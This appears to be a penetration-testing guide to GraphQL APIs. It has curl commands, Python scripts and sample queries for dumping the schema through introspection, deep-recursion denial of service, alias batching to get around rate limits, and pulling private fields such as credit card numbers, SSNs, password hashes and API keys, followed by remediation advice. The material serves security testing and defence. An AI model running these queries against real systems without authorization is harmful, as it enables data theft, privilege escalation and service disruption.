# GraphQL & Hidden Parameters

## Overview
GraphQL APIs present unique attack surfaces compared to REST. This skill covers introspection exploitation, query depth attacks, hidden parameter discovery, and batching exploitation.

## Vulnerability Categories

### 1. GraphQL Introspection
**Impact:** High (Information Disclosure)
**Complexity:** Low

#### Technique
GraphQL's introspection feature exposes schema, queries, mutations, and field types.

#### Discovery
```bash
# Detect GraphQL endpoint
curl -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__typename}"}'

# If responds with __typename: GraphQL endpoint exists
```

#### Schema Enumeration
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type
      }
    }
    queryType {
      fields {
        name
        args {
          name
          type
        }
      }
    }
    mutationType {
      fields {
        name
        args
      }
    }
  }
}
```

#### Exploitation
```bash
# Dump complete schema
introspectionQuery=$(cat introspection.graphql)

curl -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"$introspectionQuery\"}" | tee schema.json

# Tools for schema extraction
# - get-graphql-schema
# - graphql-voyager (visualization)
# - InQL (Burp extension)
```

#### Hidden Queries Discovery
```graphql
# After introspection, discover all available queries
query {
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}

# Look for admin queries, debug queries, etc.
# Example: admin_getAllUsers, debug_trace, internal_backupData
```

### 2. Query Depth/Batch Exploitation
**Impact:** High (DoS, Data Exfiltration)
**Complexity:** Medium

#### Query Depth Attacks
```graphql
# Normal query
query {
  user(id: 1) {
    posts {
      comments {
        author {
          name
        }
      }
    }
  }
}

# Deep recursion (DoS)
query {
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              posts {
                comments {
                  # ... 50+ levels deep
                }
              }
            }
          }
        }
      }
    }
  }
}
```

#### Batch Queries
```graphql
# Execute multiple operations simultaneously

# Bypass rate limiting with batching
query Query1 {
  user(id: 1) { name email }
}

query Query2 {
  user(id: 2) { name email }
}

query Query3 {
  user(id: 3) { name email }
}

# Server processes 3 queries but counts as 1 request = bypass rate limiting
```

#### Aliases for Enumeration
```graphql
# Bypass per-query monitoring
query {
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
  # ... 1000+ aliases
}

# Single request, massive data retrieval
```

### 3. Authorization Bypass via GraphQL
**Impact:** High
**Complexity:** Medium

#### Field-Level Authorization
```graphql
# Public query
{
  getholder {
    name
    publicBio
  }
}

# Attempt to access private fields
{
  user {
    name
    email          # Private?
    ssn            # Admin-only?
    internalNotes  # Hidden?
  }
}

# If accessible: Authorization bypass
```

#### Mutation Authorization
```graphql
# Check if mutations bypass authorization

mutation {
  # Can I update other users?
  updateUser(id: 999, name: "Hacked") {
    id
    name
  }

  # Can I delete resources?
  deleteOrder(id: 12345) {
    success
  }

  # Can I promote myself to admin?
  updateRole(userId: me, role: "ADMIN") {
    success
  }
}
```

### 4. Hidden Parameter Discovery
**Impact:** High
**Complexity:** Medium

#### Technique
After introspection, identify hidden/disabled parameters.

```graphql
# Introspection shows these queries
queryType {
  user(id: Int!, role: String)    # role parameter
  admin_tools                       # Hidden admin feature
  debug_internalState              # Debug endpoint
}
```

#### Parameter Tampering
```graphql
query {
  user(id: 1) {
    # Standard fields
    name
    email
    
    # Attempt hidden fields (based on schema inspection)
    internalNotes
    debugInfo
    versionHistory
    deletedAt
  }
}
```

#### Type Coercion Bypass
```graphql
# Query expects String, send Int
query {
  user(email: 12345) { name }  # Type coercion
}

# Server may bypass validation logic

# Or use null coercion
query {
  user(email: null) { name }   # Retrieve default user?
}
```

### 5. Information Disclosure
**Impact:** Medium to High
**Complexity:** Low

#### Error Messages
```graphql
query {
  sensitiveData(token: "invalid") {
    data
  }
}

# Response may contain:
# "Error validating token: wrong format. Expected JWT but got: xyz"
```

#### Timing Attacks
```graphql
# Exploit timing differences in queries

query {
  # Query A - fast if user doesn't exist: 10ms
  user(email: "admin@example.com") { name }
  
  # Query B - slow if user exists and processes data: 500ms
  userByEmail(email: "admin@example.com") {
    posts { content }
  }
}
```

## Detection Methods

### 1. Test for Introspection
```bash
curl -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name}}}"}'

# If returns type names: Introspection enabled
```

### 2. Enumerate All Queries
```python
import requests
import json

introspection_query = """
{
  __schema {
    queryType { fields { name } }
    mutationType { fields { name } }
    subscriptionType { fields { name } }
  }
}
"""

response = requests.post(
    "https://api.example.com/graphql",
    json={"query": introspection_query},
    headers={"Content-Type": "application/json"}
)

schema = response.json()
queries = schema['data']['__schema']['queryType']['fields']

print("[+] Available queries:")
for q in queries:
    print(f"  - {q['name']}")
```

### 3. Test Authorization Bypass
```python
# Test if field-level authorization works

test_queries = [
    '{ user { email } }',           # Private field
    '{ user { ssn } }',             # Admin field
    '{ user { internalNotes } }',   # Internal field
    '{ admin { secretData } }',     # Admin query
]

for query in test_queries:
    response = requests.post(
        "https://api.example.com/graphql",
        json={"query": query},
        headers={"Authorization": f"Bearer {user_token}"}
    )
    
    if "error" not in response.json():
        print(f"[+] Accessible: {query}")
    else:
        print(f"[-] Denied: {query}")
```

## Exploitation Chain

```
1. Detect GraphQL endpoint
   POST /graphql, /api/graphql, /v1/graphql

2. Enable introspection query
   Send __schema query

3. Extract complete schema
   - Queries, mutations, subscriptions
   - Field types, arguments
   - Hidden/admin endpoints

4. Identify vulnerabilities
   - Missing authorization
   - Deep recursion allowed
   - Batch operations not limited
   - Type coercion issues

5. Exploit discovered issues
   - Enumerate data via aliases
   - Access private fields
   - Perform unauthorized mutations
   - Mass data exfiltration

6. Escalate privileges if possible
   - Promote user to admin
   - Modify access tokens
   - Execute admin mutations
```

## Exploitation Examples

### Example 1: Mass User Enumeration
```graphql
query {
  # Create 1000 aliases for user enumeration
  u1: user(id: 1) { name email }
  u2: user(id: 2) { name email }
  u3: user(id: 3) { name email }
  # ... u1000
}
```

### Example 2: Private Data Extraction
```graphql
query {
  me {
    name
    email
    creditCard {           # Private field
      number
      expiry
      cvv
    }
    ssn                    # Admin-only field
    internalUserId         # Hidden field
  }
}
```

### Example 3: Admin Access
```graphql
query {
  admin {
    allUsers {
      id
      name
      email
      passwordHash
      role
    }
    systemConfig {
      apiKeys
      databaseConnection
      secretsVault
    }
  }
}
```

## Remediation

✅ **Server-Side Fixes:**
```javascript
// Disable introspection in production
const schema = new GraphQLSchema({
  query: QueryType,
});

// middleware/disable-introspection.js
const disableIntrospection = {
  __schema: () => null,
};

// Protected schema
const publicSchema = new GraphQLSchema({
  query: QueryType,
  extensions: [disableIntrospection]
});
```

✅ **Best Practices:**
- Disable introspection in production
- Implement field-level authorization
- Limit query depth (max 10-15 levels)
- Implement query cost analysis (aliases limit)
- Batch operation limits
- Rate limiting per user/IP
- Log all GraphQL queries
- Validate input types strictly (no coercion bypass)
- Hide error messages (don't expose internal structure)
- Implement RBAC for mutations

## Tools

- **get-graphql-schema**: Extract GraphQL schema
- **graphql-voyager**: Visualize schema
- **GraphQL-core**: GraphQL library
- **InQL**: Burp Suite extension
- **GraphQL Faker**: Generate test queries

## References
- [OWASP GraphQL](https://owasp.org/www-project-graphql-cheat-sheet/)
- [GraphQL Security Risks](https://blog.apollographql.com/graphql-security-in-depth)
- [HackerOne GraphQL Reports](https://hackerone.com/reports?report_type=vulnerability&vulnerability_type=Information%20Disclosure)
